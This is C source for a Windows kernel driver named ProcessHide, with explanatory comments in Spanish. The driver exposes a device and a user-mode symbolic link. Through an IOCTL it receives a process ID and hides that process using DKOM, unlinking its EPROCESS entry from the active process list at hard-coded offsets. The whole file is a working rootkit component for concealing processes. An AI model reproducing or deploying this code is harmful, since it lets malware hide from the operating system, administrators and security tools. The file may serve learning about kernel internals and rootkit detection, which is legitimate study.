
#include <ntifs.h>
#include <ntddk.h>
//Códigos numéricos que definenen una operación a realizar (mas doc en el archivo)
#include "ioctl_codes.h"
#include <stdio.h>

VOID UnloadFunc(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNICODE_STRING deviceUserModeName;
	RtlInitUnicodeString(&deviceUserModeName, L"\\??\\ProcessHide");
	IoDeleteSymbolicLink(&deviceUserModeName);
	IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("[PROCESSHIDE] : Unloaded ProcessHide!!");
}

/*
	https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/a-single-dispatchcre
	IRP_ML_CREATE es igual a IRP_MJ_CLOSE, es una práctica común como es el código de la msdn
	Las dos funciones lo que permiten es la operación de abrir y cerrar
*/
/*
	Actualiza la información dle IO Request Packet indicando que es una operación exitosa
	IoCompleteRequest() está relacionado con temas de prioridad de hilos
*/
NTSTATUS SimpleComplete(NTSTATUS status, PIRP Irp)
{
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
NTSTATUS DispatchCreateClose(PDEVICE_OBJECT Device, PIRP Irp)
{
	UNREFERENCED_PARAMETER(Device);
	return SimpleComplete(STATUS_SUCCESS, Irp);
}

/*
	Una vez definido el código de contro queda recibirlo y actuar en consecuencia
	En este código además del código recibirá el pid del proceso a ocultar
*/
NTSTATUS DispatchIOCTL(PDEVICE_OBJECT Device, PIRP Irp)
{
	UNREFERENCED_PARAMETER(Device);
	NTSTATUS status;
	PLIST_ENTRY ActiveProcessLinks;
	PIO_STACK_LOCATION curr_stack;
	PEPROCESS process;
	int eprocesspid;
	int* pid;

	// Obtener el StackLocation dirigido a nuestro driver
	curr_stack = IoGetCurrentIrpStackLocation(Irp);
	status = STATUS_UNSUCCESSFUL;

	// Comrpobar si el código recibido es uno de los que soportamo
	if (curr_stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_HIDE_PROCESS_BY_PID)
	{
		// Comrpobar que el buffer no supera el de un entero
		if (curr_stack->Parameters.DeviceIoControl.InputBufferLength <= sizeof(int))
		{
			pid = (int*)Irp->AssociatedIrp.SystemBuffer;
			DbgPrint("[PROCESSHIDE] : Received %d PID", *pid);

			if (*pid < 4) {
				DbgPrint("[PROCESSHIDE] : Incorrect PID %d", *pid);
				status = STATUS_NOT_FOUND;
			}
			else
			{
				/*
					Funcionalidad real del driver
					Entrar a la estructura EPROCESS (la que define el proceso en el executive)
					Técnica DKON que consiste en desapuntar el proceos de una lista doblemente enlazada que
					relaciona todos los procesos del sistema
				*/
				if (PsLookupProcessByProcessId((HANDLE)*pid, &process) == STATUS_SUCCESS)
				{
					eprocesspid = *((int*)process + 0x39);
					if (eprocesspid != *pid)
					{
						DbgPrint("[PROCESSHIDE] : pid found in eprocess is %d (%X)... Error!", eprocesspid, eprocesspid);
					}
					else
					{
						// los procesos anterior y siguientes se apuntan entre ellos para ocultar el dado.
						ActiveProcessLinks = (PLIST_ENTRY)((PVOID*)process + 0x3a);
						ActiveProcessLinks->Blink->Flink = ActiveProcessLinks->Flink;
						ActiveProcessLinks->Flink->Blink = ActiveProcessLinks->Blink;
						status = STATUS_SUCCESS;
					}
				}
			}
		}
	}
	else {
		DbgPrint("[PROCESSHIDE] : Unsupported Command Sent!!");
	}

	return SimpleComplete(status, Irp);
}

/*
	DriverObject contiene información sobre el propio driver
*/
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	UNICODE_STRING deviceName;
	UNICODE_STRING deviceUserModeName;
	PDEVICE_OBJECT device;
	NTSTATUS status;

	DriverObject->DriverUnload = UnloadFunc;
	/*
		En este driver se quiere obtener en modo usuario un handle al dispositivo creado
		esto implica permitir las operaciones Open y Close.
	*/
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
	/*
		Cuando se haga una petición esta es gestionada por el IO Manager que crea un paquete IRP
		Este paquete en algún momento se envia a nuestra DispatchRoutine. Cuando llegue el paquete
		se completa la petición de entrada/salida pero puede darse el caso de dejar el paquete a otro
		driver.
		También hay que permitir el envío de comandos, se lleva a cabo con código IOCTL que es un número que
		define la operación a realizar, el paquete IRP que se genere contendrá este código y los datos a enviar.
	*/
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIOCTL;

	/*
		Establecer puntos de entrada hacia el dispositivo a crear para que los
		programas en modo usuario pueda usarlo (por defecto solo son accesibles
		desde el modo kernel)
	*/
	RtlInitUnicodeString(&deviceName, L"\\Device\\ProcessHide");
	RtlInitUnicodeString(&deviceUserModeName, L"\\??\\ProcessHide"); //SymbolicLink para el modo usuario

	// Asociar al driver un dispositivo (en este caso 1 driver - 1 dispositvo asociado)
	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &device);

	if (status != STATUS_SUCCESS) {
		DbgPrint("[PROCESSHIDE] : There was a problem creating the device!!");
		return status;
	}

	status = IoCreateSymbolicLink(&deviceUserModeName, &deviceName);
	if (status != STATUS_SUCCESS) {
		DbgPrint("[PROCESSHIDE] : There was a problem creating the symbolic Link!!");
		return status;
	}

	DbgPrint("[PROCESSHIDE] : Loaded Driver!!");

	return STATUS_SUCCESS;
}

